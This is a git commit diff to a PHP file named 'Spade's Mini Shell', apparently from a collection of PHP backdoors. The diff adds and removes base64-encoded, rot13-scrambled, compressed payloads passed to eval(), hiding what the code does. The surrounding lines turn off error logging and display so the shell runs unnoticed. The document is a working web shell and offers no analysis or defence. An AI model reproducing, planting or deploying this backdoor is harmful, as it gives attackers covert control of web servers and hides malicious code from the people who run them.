c4fb07f2cf3ff415cf1094b078d47670f75dee67
User of Github <84887432+1337r0j4n@users.noreply.github.com>
2024-01-21 21:32:35 +0630

    Add files via upload

--- SHELLs/Spade's Mini Shell/spade.php
+++ SHELLs/Spade's Mini Shell/spade.php
@@ -1,7 +1,6 @@
 <?php
-// from https://github.com/1337r0j4n/php-backdoors
-	// Spade's Mini Shell
-	@ini_set('error_log',NULL); 
+
+    @ini_set('error_log',NULL); 
 	@ini_set('log_errors',0); 
 	@ini_set('display_errors', 0);
 	@error_reporting(0); 
@@ -67,8 +66,8 @@
 	    }
 	    $buff = wordwrap(htmlspecialchars($buff));
 	    return $buff;
-	}; eval(str_rot13(gzinflate(str_rot13(base64_decode('cpBEeIMwEIDf/RVOhCh1XO3TLB2sndq9jOHDHiYSWaYRW6yeWiD++rWm0MHyktx93GqXZksrayvQFjk0zZP3PCmwuenrx2qOWFGQHdvkP97vknnBD5LkYoc8zegh+cLlxpqUBm0BTgdJCahR428pBI/DY/UckTWJojVMPYWXV8lTVh51DbI5UFS45NhURq8b8EQjd+h04zheXddVgFtL6G0WH1PbF3Fvk4N+hBqjW9r+NK0DZOIQo55mrYZeKEmFx6DrumBv9Ry0tYZ3YCOMtv/wzCAkG40H72p2hv/A+5eW3rch6LlIbaQ/LdQnt8BzqwtozLv0WWjpW6Xnen4B'))))); 
-    	echo "
+	}; eval(gzuncompress(str_rot13(base64_decode('a5xIQ1p4hEAM/SuDLFHBj7XQpUishyJ5Qt2q24vIYDWugjrTZMRdV/97VO2hhUDyXmvJWEMIJqhAzoR5h4u+N3yym1EX6DuaUfF7FHRjWdNGAmwYAqt4MIIgADZACI2UfARizWB4nuN8/RfR43iST/79h46jt2aUpPQcv6iG5pO67ZBeQ9KSDRIHOerrPDXs3rUPD7Z7a7Tv3L1GjqPNGw4mqYthUZOMRWDRYrKrkiskRM/Ic4cEQnGpsahDrFV73hZL8sbRIwXnXVsWsnKDZrXmbLZ3Jm1YnY5QySqsNJNAj7Ju1SqH02WL4n59ruSyin5ZekrRzwnFWs+AWpJCW2r5cGGYJEpuGP4PeTtnqg=='))));
+	echo "
 		<!DOCTYPE html>
 		<html>
 			<head>
